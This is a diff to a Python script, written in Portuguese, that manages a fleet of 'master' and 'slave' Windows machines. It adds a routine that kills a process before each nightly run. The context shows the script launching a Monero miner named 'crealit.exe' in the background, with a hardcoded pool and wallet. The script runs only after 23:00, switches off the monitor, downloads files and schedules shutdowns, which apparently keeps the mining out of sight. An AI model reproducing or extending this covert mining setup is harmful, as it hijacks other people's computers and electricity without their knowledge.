@@ -246,6 +246,22 @@ def ligar_crealit():
     subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
+def matar_processo(nome_processo="crealit.exe"):
+    """
+    Encerra todos os processos com o nome especificado.
+    Por padrão, encerra 'crealit.exe'.
+    """
+    try:
+        subprocess.run(
+            ["taskkill", "/f", "/im", nome_processo],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            shell=False
+        )
+    except Exception as e:
+        print(f"Erro ao tentar matar o processo {nome_processo}: {e}")
+
+
 def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="255.255.255.0",
                   dns1="8.8.8.8", dns2="192.168.137.1", usar_powershell=True):
     descricao = get_computer_description()
@@ -293,6 +309,7 @@ def main_master():
     if EXECUCAO != TESTE:
         if not is_after_23():
             exit()
+    matar_processo()
     baixar_arquivos()
     desligar_monitor()  
     schedule_shutdown()  
@@ -310,6 +327,7 @@ def main_slave():
     if EXECUCAO != TESTE:
         if not is_after_23():
             exit()
+    matar_processo()
     baixar_arquivos()
     desligar_monitor() 
     configurar_ip(usar_powershell=False)
